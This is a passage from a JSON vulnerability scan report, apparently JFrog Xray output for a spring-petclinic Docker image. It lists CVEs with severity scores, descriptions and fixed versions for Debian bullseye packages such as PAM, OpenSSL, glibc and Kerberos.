         "summary": "linux-pam (aka Linux PAM) before 1.6.0 allows attackers to cause a denial of service (blocked login process) via mkfifo because the openat call (for protect_dir) lacks O_DIRECTORY.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libpam-modules-bin",
         "source_id": "deb://debian:bullseye:libpam-modules-bin",
         "source_comp_id": "deb://debian:bullseye:libpam-modules-bin:1.4.0-9+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:pam",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-22365",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "linux-pam (aka Linux PAM) before 1.6.0 allows attackers to cause a denial of service (blocked login process) via mkfifo because the openat call (for protect_dir) lacks O_DIRECTORY.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-22365",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-588807",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "linux-pam (aka Linux PAM) before 1.6.0 allows attackers to cause a denial of service (blocked login process) via mkfifo because the openat call (for protect_dir) lacks O_DIRECTORY.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libpam-runtime",
         "source_id": "deb://debian:bullseye:libpam-runtime",
         "source_comp_id": "deb://debian:bullseye:libpam-runtime:1.4.0-9+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:pam",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-22365",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "linux-pam (aka Linux PAM) before 1.6.0 allows attackers to cause a denial of service (blocked login process) via mkfifo because the openat call (for protect_dir) lacks O_DIRECTORY.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-22365",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-585478",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A vulnerability was found in systemd-resolved. This issue may allow systemd-resolved to accept records of DNSSEC-signed domains even when they have no signature, allowing man-in-the-middles (or the upstream DNS resolver) to manipulate records.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libudev1",
         "source_id": "deb://debian:bullseye:libudev1",
         "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "< 247.3-7+deb11u6"
            ],
            "fixed_versions": [
               "247.3-7+deb11u6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-7008",
                     "cwe": [
                        "NVD-CWE-Other"
                     ],
                     "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"
                  }
               ],
               "description": "A vulnerability was found in systemd-resolved. This issue may allow systemd-resolved to accept records of DNSSEC-signed domains even when they have no signature, allowing man-in-the-middles (or the upstream DNS resolver) to manipulate records.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-7008",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-585478",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A vulnerability was found in systemd-resolved. This issue may allow systemd-resolved to accept records of DNSSEC-signed domains even when they have no signature, allowing man-in-the-middles (or the upstream DNS resolver) to manipulate records.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsystemd0",
         "source_id": "deb://debian:bullseye:libsystemd0",
         "source_comp_id": "deb://debian:bullseye:libsystemd0:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "< 247.3-7+deb11u6"
            ],
            "fixed_versions": [
               "247.3-7+deb11u6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-7008",
                     "cwe": [
                        "NVD-CWE-Other"
                     ],
                     "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"
                  }
               ],
               "description": "A vulnerability was found in systemd-resolved. This issue may allow systemd-resolved to accept records of DNSSEC-signed domains even when they have no signature, allowing man-in-the-middles (or the upstream DNS resolver) to manipulate records.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-7008",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-540521",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "NCurse v6.4-20230418 was discovered to contain a segmentation fault via the component _nc_wrap_entry().",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:ncurses-base",
         "source_id": "deb://debian:bullseye:ncurses-base",
         "source_comp_id": "deb://debian:bullseye:ncurses-base:6.2+20201114-2",
         "component_versions": {
            "id": "debian:bullseye:ncurses",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-50495",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "NCurse v6.4-20230418 was discovered to contain a segmentation fault via the component _nc_wrap_entry().",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-50495",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-540521",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "NCurse v6.4-20230418 was discovered to contain a segmentation fault via the component _nc_wrap_entry().",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libtinfo6",
         "source_id": "deb://debian:bullseye:libtinfo6",
         "source_comp_id": "deb://debian:bullseye:libtinfo6:6.2+20201114-2",
         "component_versions": {
            "id": "debian:bullseye:ncurses",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-50495",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "NCurse v6.4-20230418 was discovered to contain a segmentation fault via the component _nc_wrap_entry().",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-50495",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-540521",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "NCurse v6.4-20230418 was discovered to contain a segmentation fault via the component _nc_wrap_entry().",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:ncurses-bin",
         "source_id": "deb://debian:bullseye:ncurses-bin",
         "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
         "component_versions": {
            "id": "debian:bullseye:ncurses",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-50495",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "NCurse v6.4-20230418 was discovered to contain a segmentation fault via the component _nc_wrap_entry().",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-50495",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-537103",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A vulnerability was found that the response times to malformed ciphertexts in RSA-PSK ClientKeyExchange differ from response times of ciphertexts with correct PKCS#1 v1.5 padding.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgnutls30",
         "source_id": "deb://debian:bullseye:libgnutls30",
         "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
         "component_versions": {
            "id": "debian:bullseye:gnutls28",
            "vulnerable_versions": [
               "< 3.7.1-5+deb11u4"
            ],
            "fixed_versions": [
               "3.7.1-5+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-5981",
                     "cwe": [
                        "CWE-203"
                     ],
                     "cwe_details": {
                        "CWE-203": {
                           "name": "Observable Discrepancy",
                           "description": "The product behaves differently or sends different responses under different circumstances in a way that is observable to an unauthorized actor, which exposes security-relevant information about the state of the product, such as whether a particular operation was successful or not."
                        }
                     },
                     "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A vulnerability was found that the response times to malformed ciphertexts in RSA-PSK ClientKeyExchange differ from response times of ciphertexts with correct PKCS#1 v1.5 padding.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-5981",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-535129",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "Issue summary: Generating excessively long X9.42 DH keys or checking\nexcessively long X9.42 DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_generate_key() to\ngenerate an X9.42 DH key may experience long delays.  Likewise, applications\nthat use DH_check_pub_key(), DH_check_pub_key_ex() or EVP_PKEY_public_check()\nto check an X9.42 DH key or X9.42 DH parameters may experience long delays.\nWhere the key or parameters that are being checked have been obtained from\nan untrusted source this may lead to a Denial of Service.\n\nWhile DH_check() performs all the necessary checks (as of CVE-2023-3817),\nDH_check_pub_key() doesn't make any of these checks, and is therefore\nvulnerable for excessively large P and Q parameters.\n\nLikewise, while DH_generate_key() performs a check for an excessively large\nP, it doesn't check for an excessively large Q.\n\nAn application that calls DH_generate_key() or DH_check_pub_key() and\nsupplies a key or parameters obtained from an untrusted source could be\nvulnerable to a Denial of Service attack.\n\nDH_generate_key() and DH_check_pub_key() are also called by a number of\nother OpenSSL functions.  An application calling any of those other\nfunctions may similarly be affected.  The other functions affected by this\nare DH_check_pub_key_ex(), EVP_PKEY_public_check(), and EVP_PKEY_generate().\n\nAlso vulnerable are the OpenSSL pkey command line application when using the\n\"-pubcheck\" option, as well as the OpenSSL genpkey command line application.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1w-0+deb11u2"
            ],
            "fixed_versions": [
               "1.1.1w-0+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-5678",
                     "cwe": [
                        "CWE-754"
                     ],
                     "cwe_details": {
                        "CWE-754": {
                           "name": "Improper Check for Unusual or Exceptional Conditions",
                           "description": "The product does not check or incorrectly checks for unusual or exceptional conditions that are not expected to occur frequently during day to day operation of the product."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Issue summary: Generating excessively long X9.42 DH keys or checking excessively long X9.42 DH keys or parameters may be very slow.  Impact summary: Applications that use the functions DH_generate_key() to generate an X9.42 DH key may experience long delays.  Likewise, applications that use DH_check_pub_key(), DH_check_pub_key_ex() or EVP_PKEY_public_check() to check an X9.42 DH key or X9.42 DH parameters may experience long delays. Where the key or parameters that are being checked have been obtained from an untrusted source this may lead to a Denial of Service.  While DH_check() performs all the necessary checks (as of CVE-2023-3817), DH_check_pub_key() doesn't make any of these checks, and is therefore vulnerable for excessively large P and Q parameters.  Likewise, while DH_generate_key() performs a check for an excessively large P, it doesn't check for an excessively large Q.  An application that calls DH_generate_key() or DH_check_pub_key() and supplies a key or parameters obtained from an untrusted source could be vulnerable to a Denial of Service attack.  DH_generate_key() and DH_check_pub_key() are also called by a number of other OpenSSL functions.  An application calling any of those other functions may similarly be affected.  The other functions affected by this are DH_check_pub_key_ex(), EVP_PKEY_public_check(), and EVP_PKEY_generate().  Also vulnerable are the OpenSSL pkey command line application when using the \"-pubcheck\" option, as well as the OpenSSL genpkey command line application.  The OpenSSL SSL/TLS implementation is not affected by this issue.  The OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-5678",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-535129",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "Issue summary: Generating excessively long X9.42 DH keys or checking\nexcessively long X9.42 DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_generate_key() to\ngenerate an X9.42 DH key may experience long delays.  Likewise, applications\nthat use DH_check_pub_key(), DH_check_pub_key_ex() or EVP_PKEY_public_check()\nto check an X9.42 DH key or X9.42 DH parameters may experience long delays.\nWhere the key or parameters that are being checked have been obtained from\nan untrusted source this may lead to a Denial of Service.\n\nWhile DH_check() performs all the necessary checks (as of CVE-2023-3817),\nDH_check_pub_key() doesn't make any of these checks, and is therefore\nvulnerable for excessively large P and Q parameters.\n\nLikewise, while DH_generate_key() performs a check for an excessively large\nP, it doesn't check for an excessively large Q.\n\nAn application that calls DH_generate_key() or DH_check_pub_key() and\nsupplies a key or parameters obtained from an untrusted source could be\nvulnerable to a Denial of Service attack.\n\nDH_generate_key() and DH_check_pub_key() are also called by a number of\nother OpenSSL functions.  An application calling any of those other\nfunctions may similarly be affected.  The other functions affected by this\nare DH_check_pub_key_ex(), EVP_PKEY_public_check(), and EVP_PKEY_generate().\n\nAlso vulnerable are the OpenSSL pkey command line application when using the\n\"-pubcheck\" option, as well as the OpenSSL genpkey command line application.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:openssl:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1w-0+deb11u2"
            ],
            "fixed_versions": [
               "1.1.1w-0+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-5678",
                     "cwe": [
                        "CWE-754"
                     ],
                     "cwe_details": {
                        "CWE-754": {
                           "name": "Improper Check for Unusual or Exceptional Conditions",
                           "description": "The product does not check or incorrectly checks for unusual or exceptional conditions that are not expected to occur frequently during day to day operation of the product."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Issue summary: Generating excessively long X9.42 DH keys or checking excessively long X9.42 DH keys or parameters may be very slow.  Impact summary: Applications that use the functions DH_generate_key() to generate an X9.42 DH key may experience long delays.  Likewise, applications that use DH_check_pub_key(), DH_check_pub_key_ex() or EVP_PKEY_public_check() to check an X9.42 DH key or X9.42 DH parameters may experience long delays. Where the key or parameters that are being checked have been obtained from an untrusted source this may lead to a Denial of Service.  While DH_check() performs all the necessary checks (as of CVE-2023-3817), DH_check_pub_key() doesn't make any of these checks, and is therefore vulnerable for excessively large P and Q parameters.  Likewise, while DH_generate_key() performs a check for an excessively large P, it doesn't check for an excessively large Q.  An application that calls DH_generate_key() or DH_check_pub_key() and supplies a key or parameters obtained from an untrusted source could be vulnerable to a Denial of Service attack.  DH_generate_key() and DH_check_pub_key() are also called by a number of other OpenSSL functions.  An application calling any of those other functions may similarly be affected.  The other functions affected by this are DH_check_pub_key_ex(), EVP_PKEY_public_check(), and EVP_PKEY_generate().  Also vulnerable are the OpenSSL pkey command line application when using the \"-pubcheck\" option, as well as the OpenSSL genpkey command line application.  The OpenSSL SSL/TLS implementation is not affected by this issue.  The OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-5678",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-531744",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A flaw was found in glibc. In an extremely rare situation, the getaddrinfo function may access memory that has been freed, resulting in an application crash. This issue is only exploitable when a NSS module implements only the _nss_*_gethostbyname2_r and _nss_*_getcanonname_r hooks without implementing the _nss_*_gethostbyname3_r hook. The resolved name should return a large number of IPv6 and IPv4, and the call to the getaddrinfo function should have the AF_INET6 address family with AI_CANONNAME, AI_ALL and AI_V4MAPPED as flags.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-4806",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A flaw was found in glibc. In an extremely rare situation, the getaddrinfo function may access memory that has been freed, resulting in an application crash. This issue is only exploitable when a NSS module implements only the _nss_*_gethostbyname2_r and _nss_*_getcanonname_r hooks without implementing the _nss_*_gethostbyname3_r hook. The resolved name should return a large number of IPv6 and IPv4, and the call to the getaddrinfo function should have the AF_INET6 address family with AI_CANONNAME, AI_ALL and AI_V4MAPPED as flags.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-4806",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-531744",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A flaw was found in glibc. In an extremely rare situation, the getaddrinfo function may access memory that has been freed, resulting in an application crash. This issue is only exploitable when a NSS module implements only the _nss_*_gethostbyname2_r and _nss_*_getcanonname_r hooks without implementing the _nss_*_gethostbyname3_r hook. The resolved name should return a large number of IPv6 and IPv4, and the call to the getaddrinfo function should have the AF_INET6 address family with AI_CANONNAME, AI_ALL and AI_V4MAPPED as flags.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-4806",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A flaw was found in glibc. In an extremely rare situation, the getaddrinfo function may access memory that has been freed, resulting in an application crash. This issue is only exploitable when a NSS module implements only the _nss_*_gethostbyname2_r and _nss_*_getcanonname_r hooks without implementing the _nss_*_gethostbyname3_r hook. The resolved name should return a large number of IPv6 and IPv4, and the call to the getaddrinfo function should have the AF_INET6 address family with AI_CANONNAME, AI_ALL and AI_V4MAPPED as flags.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-4806",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-529509",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A flaw was found in shadow-utils. When asking for a new password, shadow-utils asks the password twice. If the password fails on the second attempt, shadow-utils fails in cleaning the buffer used to store the first entry. This may allow an attacker with enough access to retrieve the password from the memory.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:passwd",
         "source_id": "deb://debian:bullseye:passwd",
         "source_comp_id": "deb://debian:bullseye:passwd:1:4.8.1-1",
         "component_versions": {
            "id": "debian:bullseye:shadow",
            "vulnerable_versions": [
               "< 1:4.8.1-1+deb11u1"
            ],
            "fixed_versions": [
               "1:4.8.1-1+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-4641",
                     "cwe": [
                        "CWE-287"
                     ],
                     "cwe_details": {
                        "CWE-287": {
                           "name": "Improper Authentication",
                           "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "13"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A flaw was found in shadow-utils. When asking for a new password, shadow-utils asks the password twice. If the password fails on the second attempt, shadow-utils fails in cleaning the buffer used to store the first entry. This may allow an attacker with enough access to retrieve the password from the memory.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-4641",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-529509",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A flaw was found in shadow-utils. When asking for a new password, shadow-utils asks the password twice. If the password fails on the second attempt, shadow-utils fails in cleaning the buffer used to store the first entry. This may allow an attacker with enough access to retrieve the password from the memory.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:login",
         "source_id": "deb://debian:bullseye:login",
         "source_comp_id": "deb://debian:bullseye:login:1:4.8.1-1",
         "component_versions": {
            "id": "debian:bullseye:shadow",
            "vulnerable_versions": [
               "< 1:4.8.1-1+deb11u1"
            ],
            "fixed_versions": [
               "1:4.8.1-1+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-4641",
                     "cwe": [
                        "CWE-287"
                     ],
                     "cwe_details": {
                        "CWE-287": {
                           "name": "Improper Authentication",
                           "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "13"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A flaw was found in shadow-utils. When asking for a new password, shadow-utils asks the password twice. If the password fails on the second attempt, shadow-utils fails in cleaning the buffer used to store the first entry. This may allow an attacker with enough access to retrieve the password from the memory.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-4641",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-527466",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "lib/kadm5/kadm_rpc_xdr.c in MIT Kerberos 5 (aka krb5) before 1.20.2 and 1.21.x before 1.21.1 frees an uninitialized pointer. A remote authenticated user can trigger a kadmind crash. This occurs because _xdr_kadm5_principal_ent_rec does not validate the relationship between n_key_data and the key_data array count.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5support0",
         "source_id": "deb://debian:bullseye:libkrb5support0",
         "source_comp_id": "deb://debian:bullseye:libkrb5support0:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u4"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-36054",
                     "cwe": [
                        "CWE-824"
                     ],
                     "cwe_details": {
                        "CWE-824": {
                           "name": "Access of Uninitialized Pointer",
                           "description": "The product accesses or uses a pointer that has not been initialized."
                        }
                     },
                     "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "lib/kadm5/kadm_rpc_xdr.c in MIT Kerberos 5 (aka krb5) before 1.20.2 and 1.21.x before 1.21.1 frees an uninitialized pointer. A remote authenticated user can trigger a kadmind crash. This occurs because _xdr_kadm5_principal_ent_rec does not validate the relationship between n_key_data and the key_data array count.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-36054",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-527466",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "lib/kadm5/kadm_rpc_xdr.c in MIT Kerberos 5 (aka krb5) before 1.20.2 and 1.21.x before 1.21.1 frees an uninitialized pointer. A remote authenticated user can trigger a kadmind crash. This occurs because _xdr_kadm5_principal_ent_rec does not validate the relationship between n_key_data and the key_data array count.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5-3",
         "source_id": "deb://debian:bullseye:libkrb5-3",
